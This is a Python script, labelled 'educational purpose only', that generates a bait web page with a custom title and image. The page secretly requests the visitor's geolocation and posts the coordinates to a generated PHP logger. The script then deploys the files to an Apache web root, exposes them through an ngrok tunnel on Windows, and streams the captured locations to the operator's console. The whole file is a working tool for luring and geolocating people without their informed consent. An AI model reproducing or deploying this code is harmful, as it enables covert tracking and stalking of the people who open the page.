import os
import sys
import time 
import shutil
import re


""" 
Educational purpose only

=============================
Created By: EH
"""
file_dir = " "
dir_name = " "
html_image = " "

image_clean1 = " "
image_clean2 = " "


def check_system():
    if sys.platform == "linux" or sys.platform == "linux2":
        os.system("clear")
        return "linux"
    elif sys.platform == "win32":
        os.system("cls")
        return "win32"

def htmls_clientside(user):
    global html_image, image_clean1, image_clean2

    if user == "y":
        html_title = str(input("\033[1;32m webpage title: \033[1;m"))
        html_h1 = str(input("\033[1;32m h1 text on webpage: \033[1;m"))
        html_image = str(input("\033[1;32m image file should be jpg : \033[1;m"))
        html_px1 = str(input("\033[1;32m pixel-width: \033[1;m"))
        html_px2 = str(input("\033[1;32m pixel-height: \033[1;m"))
    elif user == "n":
        html_title = "EH"
        html_h1 = "EH"
        html_image = "Anonymous.jpg" 
        html_px1 = "1000"
        html_px2 = "1600"
    else:
        print("\033[1;36m ERROR \033[1;m")

    image_clean1 = re.sub(r'.*/', '', html_image)
    image_clean2 = re.sub(r'.*\\', '', image_clean1)


    indexfile = """ 

<!DOCTYPE html>
<html>
    <head>
        <title>%s</title>
        <style type="text/css">
            body {
                background-image: url("%s");
                background-size: %spx %spx;
                background-repeat: no-repeat;
                background-position-y: 100px;
                background-position-x: 10px;
            }
        </style>
    </head>

    <body>
        <h1>%s</h1>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
        <script type="text/javascript">
            navigator.geolocation.getCurrentPosition(positon)

            function positon(location){
                $.post('saver.php', {'lat':location.coords.latitude, 'lng':location.coords.longitude},function(res){
                    console.log(res);
                })
            }


        </script>
    </body>
</html>
    """%(html_title, image_clean2, html_px1, html_px2, html_h1)
    opnr = open("index.html", "w")
    opnr.write(indexfile)
    opnr.close()



def server_side():
    
    serverfile = """ 
<?php
   print_r($_POST);
   $a = fopen("save.txt", "a");
   fwrite($a,"Location: $_POST[lat],$_POST[lng]\n=================\n");
   fclose($a);
?>
    """
    opnr = open("saver.php", "w")
    opnr.write(serverfile)
    opnr.close()

def listener(files):
    try:
        files.seek(0,2)
        while True:
            contents = files.readlines()
            if not contents:
                time.sleep(0.1)
                continue
            
            yield contents
    except FileNotFoundError:
        time.sleep(10)
        pass

def cpaste_linux():
    try:
        filename = "index.html"
        writename = "/var/www/html/index.html"
        for i in range(0, 2):
            opnr = open(filename, "r")
            data = opnr.read()
            opnr.close()
            
            opnr = open(writename, "w+")
            opnr.write(data)
            opnr.close()
            
            filename = "saver.php"
            writename = "/var/www/html/saver.php"
    except FileNotFoundError:
        return 1

    return 0

def cpaste_windows():
    global dir_name, file_dir
    try:
        filename = "index.html"
        dir_name = str(input("\033[1;32m Enter htdocs Path: \033[1;m"))
        
        write_file = dir_name + "/index.html"

        for i in range(0, 2):
            opnr = open(filename, "r")
            data = opnr.read()
            opnr.close()
            
            opnr = open(write_file, "w+")
            opnr.write(data)
            opnr.close()
            
            filename = "saver.php"
            write_file = dir_name + "/saver.php"
            file_dir = dir_name + "/save.txt"
    except FileNotFoundError:
        return 1

    return 0


def startscript():
    check_system()
    user_input = str(input("\033[1;32m Do you want to modify the Index HTML file y/n: "))
    htmls_clientside(user_input)
    server_side()

    if check_system() == "linux":
        cpaste_linux()
        if cpaste_linux == 1:
            print("\033[1;32m move index.html and saver.php to /var/www/html in apache2 \033[1;m")
            time.sleep(5)
            os.system("apache2 start")
            os.system("clear")
        file_dir = "/var/www/html/save.txt"
        os.system("clear")
    
    elif check_system() == "win32":
        cpaste_windows()
        if cpaste_windows == 1:
            print("\033[1;32m move index.html and saver.php to htdocs in apache and start the apache server\033[1;m")
            time.sleep(5)
            os.system("cls")

        os.system("start call ngrok_win32 http 80")
        file_dir = dir_name + "/save.txt"
        os.system("cls")

    
    if check_system() == "win32":
        shutil.copy(html_image, dir_name)
    else:
        shutil.copy(html_image, "/var/www/html")

    #cpaste_image()
    check_system()

if __name__ == "__main__":
    startscript()
    #file_dir = str(input("\033[1;32m Enter Save.txt Path: \033[1;32m"))

    count = 0
    while count < 1:
        try:
            log = open(file_dir, "r")
            count += 1
            loglines = listener(log)
            for line in loglines:
                print (line)
        except FileNotFoundError:
            continue
